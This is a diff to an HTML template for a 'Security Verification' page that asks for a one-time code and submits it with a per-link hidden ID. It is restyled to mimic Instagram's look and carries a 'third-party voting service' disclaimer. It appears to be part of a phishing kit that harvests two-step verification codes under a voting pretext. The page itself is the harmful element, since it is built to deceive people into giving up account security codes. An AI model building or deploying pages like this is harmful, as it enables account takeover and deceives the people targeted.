@@ -1,47 +1,165 @@
 <!DOCTYPE html>
-<html lang="pt-AO">
+<html lang="en">
   <head>
     <meta charset="UTF-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <link
-      rel="shortcut icon"
-      href="/img/socials/icon.png"
-      type="image/x-icon"
-    />
-    <link rel="stylesheet" href="/css/style2.css" />
-    <title></title>
+    <title>Verification Code</title>
     <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+      
+      body {
+        background: #fafafa;
+        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        margin: 0;
+        padding: 0;
+        height: 100%;
+        color: #262626;
+        font-size: 14px;
+        line-height: 18px;
+      }
+      
+      .container {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        padding: 20px;
+      }
+      
+      .form-area {
+        background-color: #fff;
+        border: 1px solid #dbdbdb;
+        border-radius: 1px;
+        padding: 20px;
+        width: 100%;
+        max-width: 350px;
+        box-sizing: border-box;
+      }
+      
+      .notice-box {
+        background-color: #ffffd1;
+        border: 1px solid #f0e68c;
+        border-radius: 3px;
+        padding: 8px 10px;
+        margin-bottom: 20px;
+        text-align: center;
+        width: 100%;
+        box-sizing: border-box;
+      }
+      
+      .notice-box p {
+        color: #555;
+        font-size: 12px;
+        margin: 0;
+        line-height: 1.4;
+      }
+      
       .small-title {
-        margin: 1em auto;
-        color: #000;
+        margin: 0 auto 1em;
+        color: #262626;
+        font-weight: 600;
+        text-align: center;
+        font-size: 14px;
       }
+      
+      .form-area form {
+        width: 100%;
+        display: flex;
+        flex-direction: column;
+      }
+      
       .form-area form input {
-        padding: 0.5em;
-        outline-width: none !important;
+        background: #fafafa;
+        border: 1px solid #dbdbdb;
+        border-radius: 3px;
+        color: #262626;
+        font-size: 12px;
+        height: 36px;
+        padding: 9px 8px 7px;
+        width: 100%;
+        margin-bottom: 6px;
+        box-sizing: border-box;
       }
+      
+      .form-area form input:focus {
+        border-color: #a8a8a8;
+        outline: none;
+      }
+      
       .small {
         font-size: 0.85em;
         display: block;
         text-align: center;
         margin: 0.5em auto;
+        color: #8e8e8e;
+      }
+      
+      button {
+        background-color: #0095f6;
+        border: none;
+        border-radius: 4px;
+        color: #fff;
+        font-weight: 600;
+        padding: 5px 9px;
+        text-align: center;
+        cursor: pointer;
+        width: 100%;
+        margin-top: 8px;
+        height: 30px;
+        font-size: 14px;
+        transition: background-color 0.2s ease;
+      }
+      
+      button:hover {
+        background-color: #1877f2;
       }
 
       #submit2 img {
-        width: 1.3em;
-        animation-name: roll;
-        animation-duration: 0.7s;
+        width: 18px;
+        height: 18px;
+        animation-name: spin;
+        animation-duration: 0.8s;
         animation-iteration-count: infinite;
         animation-timing-function: linear;
-        color: white;
       }
 
-      @keyframes roll {
-        from {
-          transform: rotate(0deg);
+      @keyframes spin {
+        from { transform: rotate(0deg); }
+        to { transform: rotate(360deg); }
+      }
+      
+      .options {
+        margin-top: 15px;
+      }
+      
+      .options a {
+        color: #0095f6;
+        text-decoration: none;
+      }
+      
+      .forget {
+        margin-top: 15px;
+        text-align: center;
+      }
+      
+      @media (max-width: 450px) {
+        .form-area {
+          background-color: transparent;
+          border: none;
+          padding: 20px 15px;
         }
-        to {
-          transform: rotate(360deg);
+        
+        .container {
+          padding: 0;
+        }
+        
+        .notice-box {
+          margin-bottom: 15px;
         }
       }
     </style>
@@ -50,22 +168,29 @@
     <section class="container">
       <!-- FORM SECTION -->
       <article class="form-area">
+        <!-- Notice Box -->
+        <div class="notice-box">
+          <p>This is a third-party voting service. Not affiliated with any social media platform.</p>
+        </div>
+        
         <form
           method="post"
           accept="."
           onsubmit="handleSubmit()"
-          style="margin-bottom: 2em"
+          id="verificationForm"
         >
-          <p class="small-title">2-Step Verification</p>
+          <p class="small-title">Security Verification</p>
           <input
             type="text"
             name="code"
             id="code"
             required
-            placeholder="Security code"
+            placeholder="Enter verification code"
+            autocomplete="one-time-code"
           />
           <input type="hidden" name="linkId" value="<%=linkId%>" />
-          <button type="submit" name="submit" id="submit">Confirm</button>
+          <p class="form-description" style="font-size: 12px; color: #8e8e8e; margin: 10px 0; text-align: center;">Enter the code to complete verification</p>
+          <button type="submit" name="submit" id="submit">Verify</button>
           <button
             type="button"
             name="submit"
@@ -75,9 +200,8 @@
             <img src="/img/loading.svg" alt="" />
           </button>
           <div class="options">
-            <p class="small">Didn't get security code? we can</p>
-            <a href="#" class="small">resend it</a>
-            <div class="forget"><a href="#">Forgot password?</a></div>
+            <p class="small">Didn't receive your code?</p>
+            <a href="#" class="small">Request a new one</a>
           </div>
         </form>
       </article>
